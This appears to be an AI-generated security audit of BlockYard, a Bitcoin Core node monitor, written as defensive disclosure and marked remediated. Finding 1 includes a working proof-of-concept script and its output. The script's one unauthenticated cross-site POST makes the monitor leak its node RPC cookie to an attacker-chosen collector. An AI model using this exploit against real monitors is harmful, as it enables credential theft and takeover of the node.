# BlockYard Security Audit

> **STATUS: REMEDIATED — 2026-09-13, the same day.** Finding 1 (HIGH) is fixed: the node-connection
> probe now sends credentials only to the endpoint the monitor is already configured for, and open
> mode refuses cross-site state-changing requests by `Origin` / `Sec-Fetch-Site`. The exploit below
> was re-run against the patched code and the collector received no `Authorization` header.
> Findings 4, 5, 8 and 10 are fixed in the same pass. Finding 2 (allowlist prefixes) is open by
> decision. Regression tests: `test/config-node-security.test.js`, `test/session-ttl.test.js`,
> `test/random-password.test.js`, `test/audit-redaction.test.js`.
>
> The proof of concept is kept deliberately: it is the blueprint for the regression test and the
> record of how the finding was verified. It is not a live weapon against a current build.
>
> Two corrections to the report's own metadata: the address it gave for the model host has been
> replaced with an RFC 5737 documentation address, per this project's privacy rule, and the
> project line names the product and the node as they are now (BlockYard, Bitcoin Core).

- **Project:** BlockYard — a multi-user web monitor for a Bitcoin Core node (`/storage/blockyard`)
- **Audit date:** 2026-09-13 (single session)
- **Scope:** full code + security audit of `server/`, `public/`, `scripts/`, `test/` (~44,100 lines across 154 files), the deployment posture (systemd unit, port guard, config defaults), and the `SECURITY.md` / `docs/SECURITY.md` claims vs. code
- **Repo state at audit:** branch `main` @ `4c3e952`; working tree carries only screenshot re-shoots plus untracked `scripts/shots.mjs` (a zero-dependency CDP screenshot driver; reviewed, no security findings)
- **Method:** manual review of every security-relevant module (HTTP server, static, API routes, auth users/sessions, RPC client/allowlist, SSE hub, netinfo CIDR gate, audit store, config validation, markets feed, explorer server and client, telemetry/audit routes); repo-wide pattern scans (hardcoded secrets, eval/Function, child_process, DOM sinks, weak crypto, TLS relaxation, CORS wildcards, path-join-from-input); frontend XSS sink tracing against `fmt.esc()` coverage; dynamic verification — `npm test` (742/742 pass), `bash scripts/smoke.sh` (109/109 pass), and a **live exploit PoC** (Finding 1).
- **Report generator model:** GLM-5.3-Flash-EXL3 (served via 198.51.100.20:8888), running as Hermes Agent by Nous Research.

## Executive summary

| verdict | counts |
|---|---|
| High findings | **1** — credential leak, CONFIRMED with PoC |
| Medium findings | 3 |
| Low findings | 6 |
| Positive / defence-in-depth observations | 14 |
| Test evidence | 742/742 unit · 109/109 smoke |

This codebase is unusually security-disciplined for a LAN monitor: real CSRF (double-submit, header-or-body only, timing-safe compare), scrypt with per-user stored parameters and transparent cost upgrades, token-hashed sessions, timing-safe password compares including an equal-KDF-cost decoy hash for unknown users, a default-deny RPC allowlist with deny-before-allow ordering, symlink-aware plus realpath-containment static serving, a byte-exact CIDR gate that fails closed, a hard `viewer` ceiling for open access, and a docs culture where every security claim cites a measurement and a date.

**But the discipline has a hole, and it is in the newest, least-reviewed code.** The node-connection form added 2026-09-12 (`/api/config/node/test`) combines two shortcuts into a **confirmed, reproduced credential leak**: an RPC probe that inherits the monitor's node cookie, aimed by a request that needs neither a session nor a CSRF token. One HTTP POST moves the monitor's node RPC credential to any URL the requester can name.

> Historical note: the PoC in Finding 1 was reproduced against commit `4c3e952` on 2026-09-13. Once the fix ships (roadmap in the last section), this finding and its PoC become historical record — the PoC stays here on purpose, as the regression test's blueprint and the record of how it was verified.

---

## Finding 1 — HIGH, CONFIRMED WITH POC: `/api/config/node/test` leaks the node RPC credential, and the route is CSRF-exempt in open mode

**Files:** `server/http/api.js:722–749` (route), `server/http/api.js:735–736` (probe construction), `server/http/api.js:65–67` (`configWriteAllowed`), `server/http/server.js:202–218` (CSRF gate and its `&& session` clause), `server/config.js:569–589` (`resolveCookie`)

**The mechanism, in three parts:**

1. **The probe inherits live credentials.** The test route builds a throwaway client like this:

   ```js
   const probe = new RpcClient({ ...(app.cfg.nodes?.[0] ?? {}), ...node, id: 'probe' },
     { ...app.cfg.rpc, timeoutMs: Math.min(app.cfg.rpc.timeoutMs ?? 8000, 8000) }, { log: () => {} });
   ```

   `app.cfg.nodes[0]` carries — or resolves on demand via `resolveCookie` from `<datadir>/<chain>/.cookie` — the monitor's **real node RPC credential**. The four body fields overwrite only what they name, so unless the request *also* supplies fresh credentials, the probe authenticates to whatever URL it was pointed at as the monitor itself. The route's own comment calls this out as intended behaviour ("The probe inherits the CURRENT node's credentials") for probing "the way this monitor already does" — that inheritance is precisely what turns the route into an exfiltration primitive.

2. **The route is reachable without an account by design.** It is declared `auth: 'any'`, and `configWriteAllowed()` applies `needRole('admin')` only when `auth.enabled`. Open access is the **shipped default** (`auth.enabled: false`, `server/config.js:209`), and the default node entry has `datadir: '/storage/bitcoinmachinecode/data'` — so on this box, out of the box, the probe has a real cookie to send.

3. **CSRF does not protect it in open mode.** The double-submit check is gated `if (route.csrf && session)` (`server/http/server.js:202`). In open mode there is no session — deliberately, so the read-only RPC console stays usable — so any cross-site form or fetch POST rides straight through. The code comments argue open mode is still safe because "node writes are refused" — but this route is **not a node write** (it writes nothing, so the `actionAllowed` double gate never sees it), and its effect is to make the *monitor* initiate a credentialed request to a requester-chosen URL. The `viewer` ceiling does not apply either, because the danger is not what the caller may read — it is what the server sends on the caller's behalf.

**Impact:** anyone who can get a browser on this LAN to submit a form to `http://<monitor>:21000/api/config/node/test` (or anyone who can reach the port directly) receives the node's RPC credential — the same credential that can drive the node's full RPC surface — plus can use the route as a scan/exfiltration beacon from the monitor's network position (intranet probing with an oracle in `ms`/`chain`/`blocks` fields). With the default deployment, the credential also authorises full node writes (`sendtoaddress` is denied by the node's own posture only if the node implements it; the monitor's allowlist does not bind a direct attacker holding the cookie).

**Reproduction — live, on the real app (2026-09-13, commit `4c3e952`):** the app was booted in-process by `test/helpers/http.js` with `auth.enabled: false` (the shipped default), a secret cookie planted at `<datadir>/main/.cookie`, and an attacker-controlled collector running on loopback. One unauthenticated POST — no session, no CSRF token, no Origin header, exactly the shape of a cross-site form post — later, the collector log:

```
COLLECTOR SAW: {"url":"/","auth":"Basic ***",
                "body":"{\"jsonrpc\":\"1.0\",\"id\":\"c0\",\"method\":\"getblockchaininfo\",\"params\":[]}"}
>>> CREDENTIAL LEAKED: the monitor sent its node cookie to the attacker-chosen URL,
    on a request with no session and no CSRF token
```

The `Authorization` header on the collector side decoded to the planted cookie's exact `user:password`. The monitor's own logs for the same run show the tier polls failing with `RPC authentication failed (cookie rejected)` — i.e. the planted cookie was genuinely the live credential the monitor was using.

**The PoC, kept for the record** (historical once fixed; doubles as the blueprint for the regression test):

```js
// PoC: open-mode /api/config/node/test — CSRF skip + credential inheritance.
// Boots the real app (auth OFF, the shipped default), plants a node cookie in the
// datadir, then POSTs an attacker-chosen rpcUrl with no session, no CSRF token and
// no Origin header — the shape of a cross-site form post. If the probe inherits the
// monitor's RPC credential, the collector's Authorization header proves it.
import fs from 'node:fs';
import path from 'node:path';
import http from 'node:http';
import { withApp } from '/storage/blockyard/test/helpers/http.js';

let caught = null;
const sink = http.createServer((req, res) => {
  let b = '';
  req.on('data', (c) => (b += c));
  req.on('end', () => {
    caught = { url: req.url, auth: req.headers.authorization ?? null, body: (b || '').slice(0, 300) };
    res.writeHead(404);
    res.end();
  });
});
await new Promise((r) => sink.listen(0, '127.0.0.1', r));
const sinkPort = sink.address().port;

await withApp({ nodes: 1, config: { auth: { enabled: false } }, auth: false }, async (h) => {
  const { client, app, port, dir } = h;
  // The node's real secret, where resolveCookie looks: <datadir>/<chain>/.cookie
  fs.mkdirSync(path.join(dir, 'main'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'main', '.cookie'), 'realuser:SUPER-SECRET-COOKIE-VALUE\n');

  const res = await fetch(`http://127.0.0.1:${port}/api/config/node/test`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ rpcUrl: `http://127.0.0.1:${sinkPort}/`, datadir: dir }),
  });
  console.log('status', res.status);
  const j = await res.json().catch(() => null);
  console.log('reply', JSON.stringify(j).slice(0, 300));

  await new Promise((r) => setTimeout(r, 1500));
  if (caught) {
    const expected = Buffer.from('realuser:SUPER-SECRET-COOKIE-VALUE').toString('base64');
    console.log('COLLECTOR SAW:', JSON.stringify(caught));
    console.log(
      caught.auth === `Basic ${expected}`
        ? '>>> CREDENTIAL LEAKED: the monitor sent its node cookie to the attacker-chosen URL, on a request with no session and no CSRF token'
        : 'no leak (header mismatch)',
    );
  } else {
    console.log('COLLECTOR SAW NOTHING — probe did not fire or did not inherit credentials');
  }
  await app.shutdown({ saveHistory: false }).catch(() => {});
});
sink.close();
process.exit(0);
```

**Fix (three layers, all three should land):**

1. **Never inherit credentials into a caller-directed probe.** Build the probe from the request's four fields *plus nothing*: if the request names a datadir or cookieFile the operator has not yet saved, resolve the cookie from *that* candidate path — never from the live `nodes[0]`. If no candidate credential exists, probe unauthenticated and say so in the reply. (The current "inherit" behaviour also misprobes: it reports success for endpoints the candidate itself cannot authenticate to.)
2. **Make the route's auth match its risk.** It steers node connectivity and, until (1) lands, carries a credential — `auth: 'admin'` (or at minimum `configWriteAllowed` unconditionally). If the operator wants it usable in open mode, that must be a deliberate flag like `allowWritesWithoutAuth`, not a default.
3. **Close the open-mode CSRF hole for every stateful POST.** The `&& session` clause is right for pure reads, but any route that causes the *server* to act (probe, save, settings POST) should require a token even when accounts are off: issue an anonymous double-submit cookie for open mode, or gate those routes behind `Origin`/`Sec-Fetch-Site` validation. Today's code has the right intent documented and the opposite behaviour shipped.

**Regression tests to add** (the PoC converts directly): leak assertion (collector must see **no** `Authorization` header); 403 for the test route in open mode after re-auth; CSRF rejection for `POST /api/config/node` and `/api/settings` with no session.

---

## Finding 2 — MEDIUM: RPC allowlist prefix table lets read-verbs ride on mutating namespaces

**File:** `server/rpc/allowlist.js:49–67`

`ALLOW_PREFIXES` includes bare `get`, `list`, `estimate`, `verify`, `createraw`, `decoderaw`. `createraw*` builds unsigned transactions — it is correctly defended today only because `sign*` and `send*` are denied elsewhere, and because `submitpackage`/`sendrawtransaction` are exact-denied. But the same shape that bit `getnewaddress` (deny-exact fix) will bite the next node build that adds e.g. `getnewkey`, `getprivatekey`, `listunspentwithkeys`, or any future `get*`/`list*` that reads wallet secrets or node state the operator would not publish. The file's own header says a prefix rule "would be a hole, not a guard" — then ships three of them. The exact-deny list is a blacklist racing a node's method table; this deployment pins a specific node version, but the monitor is documented to work against nodes whose answers "changed shape three times in a day".

**Recommendation:** invert to an explicit allowlist of method names actually used by the UI plus a curated read set (the project already keeps `docs/RPC_LIVE_NODE.md` with the live method catalogue — 165–171 methods measured). Keep prefix rules only for `bmcget|bmclist|bmcestimate|bmcverify`, which are vendor-namespaced and documented. Add a test that walks the node's `help` output and asserts every `get*`/`list*` method not on the allowlist is denied.

## Finding 3 — MEDIUM: `/api/config/node` (save) and `/api/settings` are CSRF-exempt in open mode, and the save can aim the monitor at an attacker-chosen RPC endpoint

**Files:** `server/http/api.js:751–794` (save), `server/http/api.js:824–847` (settings POST), same `&& session` CSRF clause as Finding 1.

The save route is better defended than the probe (needs `confirm: "save"`, refuses to accept credentials, is audited), but in open mode it still accepts a cross-site POST that rewrites `config/local.json` `nodes[0].rpcUrl` — after the next restart, the monitor hands its node traffic (and, with a datadir, its cookie) to whatever endpoint the form named. Combined with Finding 1's probe, an attacker gets a read-back oracle for the saved URL via `GET /api/nodes` (`rpcUrl` is published per node) and `/api/config`. `/api/settings` is capped at 256 KB and schema-clamped on read, so the direct risk is defacement/DoS of display state, not code execution — but it is the same missing-gate class. Both routes are also reachable cross-site in open mode today.

**Recommendation:** same as Finding 1 layer 3 (origin/CSRF for stateful POSTs in open mode) — plus consider making the save route require the `confirm` value to equal a value the server generated into the page (`confirm: "save"` is a constant a cross-site form can supply).

## Finding 4 — MEDIUM: `randomPassword()` alphabet modulo bias and no strength floor on generated passwords

**File:** `server/auth/users.js:233–239`

`alphabet[bytes[i] % alphabet.length]` with `alphabet.length = 69` biases the first 187 byte values (`256 % 69 = 49` surplus across the low indices); per character the entropy loss is small (~0.02 bits) but the construction is the wrong shape for a function whose entire job is to be the bootstrap credential, and the same store enforces a 12-char minimum + breach-corpus checks on *human* passwords while exempting its own output from nothing (it is only 20 chars, fine, but the check asymmetry shows the function predates the policy). Also `crypto.randomBytes` is right; `Math.random` would not be — keep it that way.

**Recommendation:** rejection-sample (`while (v >= 256 - (256 % n)) redraw`) or use `crypto.randomInt(alphabet.length)`. One-line change, test with a distribution assertion over 10k draws.

---

## Finding 5 — LOW: `sessionTtlMs` (8 h) vs `idleTtlMs` (72 h) inversion makes "idle ceiling" longer than absolute lifetime

**Files:** `server/auth/sessions.js:71–72`, `server/config.js:211–212`

The absolute TTL (8 h) is shorter than the idle ceiling (72 h), so the idle check is dead code: no session can outlive 8 h regardless of activity. The docs (`docs/SECURITY.md:62–63`) describe it as "Sessions expire after 8 hours, with a 72-hour idle ceiling", which is the inverted relationship (an idle ceiling should be shorter than the absolute lifetime). Either the config values are swapped (likely: idle 8 h, absolute 72 h matches the names' semantics) or the docs sentence is.

**Recommendation:** pick the intended semantics, swap one number, and add a test asserting `idleTtlMs <= sessionTtlMs`.

## Finding 6 — LOW: login error path burns the scrypt KDF twice for wrong-password on an *existing* user

**File:** `server/auth/users.js:127–158` — `verify()` runs one scrypt derive; fine. But `needsRehash` triggers a **second** full derive on the same login for any user whose stored params differ from config (correct), while `server/http/api.js:251–255` throttles per address at 0.5 req/s capacity 10 — meaning a burst of 10 up-front attempts is allowed before throttling, each costing up to two scrypt derives (~40 ms + 32 MB RSS spike each on this box's measured numbers). The math is survivable (20 req/s burst worst case ≈ 0.8 core), but the two-derive path during rehash also runs on *successful* logins and is unbounded by any queue.

**Recommendation:** bound concurrent logins (a 1-slot login semaphore) so the KDF cost cannot be parallelised; drop the burst capacity from 10 to 3–5.

## Finding 7 — LOW: `test/tls.test.js` sets `NODE_TLS_REJECT_UNAUTHORIZED=0` process-wide

**File:** `test/tls.test.js:147–178`

It saves/restores the variable around the test, and rule 24 says env mutation races siblings in a file — the restore pattern here is the best available, but any *concurrent file* running TLS-touching assertions during that window inherits a disabled verifier. Zero-dependency constraint limits options; still worth a comment + a narrower window (set immediately before the request, restore in `finally` on the same tick), or an `--insecure`-free design using the suite's own CA.

## Finding 8 — LOW: `getblock` drilldown allows `height` up to 12 digits without an upper clamp

**File:** `server/http/api.js:905–906`

`/^\d{1,12}$/` accepts heights past the tip; the node's own error is surfaced (good), so this is not a fault — but it costs one lane turn per junk request, and the lane is the node's single thread. `clampInt` exists and is not used here.

**Recommendation:** clamp against `m.state.chainInfo?.blocks` when known, 400 otherwise.

## Finding 9 — LOW: SSE per-client `pendingSnapshot` retains the last full snapshot object shared across clients

**Files:** `server/http/sse.js:99–108`, and `server/http/api.js` `fullState()` builds a fresh object per client call, but hub pushes share one `snap` reference across all clients (`wireMonitor` pushes one `snap` to all).

Not a leak (one object, many readers) and not a correctness bug — but any future mutation of a pushed snapshot in place would be a cross-client data bleed. Worth a comment establishing "snapshots are immutable once pushed", or a freeze in debug builds.

## Finding 10 — LOW: audit trail trusts `entry` shape and `preview()` slices to 200 chars of arbitrary result JSON

**Files:** `server/main.js:217–224` (`delete entry.password; delete entry.rpcPassword`), `server/http/api.js:1211–1214`

`preview()` of an action result is truncated but not redacted: an action whose result echoes arguments (e.g. a future `importprivkey`-shaped action) would land secrets in `audit.jsonl`. Today's four actions are safe (`broadcast`, `savemempool`, `testmempoolaccept`, `verifychain`), and the deny-exact list keeps `importprivkey` out — but the audit sink has no denylist of key-shaped fields, only the two hardcoded `delete`s at the wrapper.

**Recommendation:** redact by pattern in `app.audit` (`/pass|secret|key|cookie|token/i` on key names), and add a test that posts an action-shaped row containing `privateKey` and asserts the stored row is redacted.

---

## Positive observations (what is done right — keep these)

1. **CSRF done properly**: double-submit, header-or-body only (cookie never accepted — `server/http/server.js:202–218`), timing-safe compare (`sessions.js:215–221`), and the comment explains why the cookie must not be accepted.
2. **Session tokens are 32 random bytes, stored hashed; the store file is 0600, atomic tmp+rename writes everywhere** (`sessions.js:36–42`, `users.js:44–53`).
3. **Equal-KDF-time for unknown usernames** with a decoy hash (`users.js:129–141`) — the response-time oracle is closed properly, and `timingSafeEqual` is length-guarded.
4. **Login throttling is layered**: per-address token bucket in front of the KDF (`api.js:251–255`), plus `LoginGuard` keyed on both username and address (`sessions.js:146–190`) — the two spray shapes are distinguished, not conflated.
5. **The `viewer` ceiling is structural, not configurational** (`server.js:258–265`): frozen object, checked on both branches (the comment at lines 183–192 shows someone burned themselves on exactly the "open becomes open-admin" bug and fixed it at the right layer).
6. **Node writes need four independent yeses** (config enable, allow list, accounts-or-deliberate-override, typed per-call confirm), and the config loader refuses to boot the dangerous combination rather than trusting the operator (`config.js:544–546`).
7. **Static serving does both containment checks**: lexical prefix *and* realpath, so traversal and planted symlinks are different attacks both stopped (`static.js:149–170`).
8. **CIDR membership is byte-exact, fails closed on malformed entries, and config validation refuses unusable entries at boot** (`netinfo.js:124–252`, `config.js:534–537`) — the history comment (text-prefix matching over-permitted) is a real vulnerability class, correctly fixed and tested.
9. **Security headers are complete and coherent**: strict CSP without `unsafe-inline` anywhere (inline styles are *absent from the code*, enforced by test), per-response nonces for scripts only, `frame-ancestors 'none'`, nosniff, DENY, no-referrer, Permissions-Policy; HSTS only over TLS and only when configured (`static.js:37–78`).
10. **Credentials never reach logs or the audit trail**: the logger scrubs password/secret/cookie patterns and credential-in-URL (`main.js:391–409`), the audit wrapper deletes credential fields (`main.js:217–224`), and the login endpoint never distinguishes "no such user" from "wrong password".
11. **The RPC lane is a DoS *defence*, not just etiquette**: one in-flight request, spacing, global rate ceiling, stale-drop, and a circuit breaker that respects already-queued work — this protects the node from the monitor's own users, which is the correct threat model for this box.
12. **Fail-closed posture throughout**: unknown RPC methods denied; unknown actions denied; undecodable config entries refused at boot; a corrupt users store refuses to start rather than silently recreating an admin (`users.js:37–41`); a half-configured TLS pair is fatal (`config.js:474–505`).
13. **Outbound surface is one documented, optional, on-demand connection set** (markets), with a boot warning for plaintext and `BLOCKYARD_MARKETS=0` documented; no telemetry, no CDNs, browser `connect-src 'self'`.
14. **The docs make falsifiable claims and the code cites them** — `SECURITY.md`/`docs/SECURITY.md` match the code on every point this audit checked (scrypt params, session TTLs modulo Finding 5, allowlist behaviour, cookie handling, the last-admin rule), which is rare.

## Claims vs code (docs audit)

| claim | verdict |
|---|---|
| "read-only RPC console behind a default-deny allowlist" | true, modulo Finding 2's prefix surface |
| "every state-changing request must carry X-CSRF-Token" (`docs/SECURITY.md:65`) | **false in open mode** for the stateful POSTs (Findings 1, 3) — the doc itself caveats "with accounts off there is no session to ride, so the check does not apply", but the routes affected are not reads |
| "node writes: off by default, four gates" | true, verified in code and by smoke test 109 |
| "Sessions expire after 8 hours, 72-hour idle ceiling" | code matches, semantics inverted (Finding 5) |
| "Passwords never logged, never returned" | true — scrubbed in logger, `publicUser()` whitelists fields |
| "data/ and config/local.json git-ignored" | true (`.gitignore` confirmed by clean `git status` around real data) |
| "credentials read from cookie on demand, never sent to browser" | true for the monitor's own calls; **false for the probe path** (Finding 1) |

## Remediation roadmap (ordered)

1. **Now (Finding 1):** strip credential inheritance from the probe; re-auth the route; add the three regression tests from the PoC. This is a same-day fix; the PoC is the test.
2. **Now (Findings 3):** origin/`Sec-Fetch-Site` or anonymous-CSRF for `POST /api/config/node` and `/api/settings` in open mode; make `confirm` a server-issued value.
3. **Next (Finding 2):** explicit method allowlist for `get*`/`list*` namespaces, curated from `docs/RPC_LIVE_NODE.md`; deny-prefix test over the node's own `help` catalogue.
4. **Next (Finding 4):** `crypto.randomInt` in `randomPassword()`.
5. **Hygiene (5–10):** TTL semantics fix, login semaphore, junk-height clamp, audit redaction by pattern, immutability comment on pushed snapshots, narrower TLS-env window in the one test that needs it.

## Verification evidence (this audit)

- `npm test` → **742/742 pass** (16.1 s), run 2026-09-13 against `4c3e952`.
- `bash scripts/smoke.sh` → **109/109 pass**, including "node writes are refused with no identity" and "the boot announces the posture".
- Finding 1 PoC → collector received the planted credential as `Authorization: Basic ***` on an unauthenticated, CSRF-less POST; run output quoted in the finding.
- Static scans: zero hardcoded secrets in non-test code; zero `eval`/`new Function`; zero SQL interpolation (the one SQLite store uses fixed statements with bound params via `node:sqlite`); `Math.random()` confined to visual/animation code (never auth, never session, never tokens); `rejectUnauthorized:false` confined to the one TLS test that restores it; no CORS wildcards; no `path.join` on request-controlled input outside the two containment-checked static paths.

*End of report.*
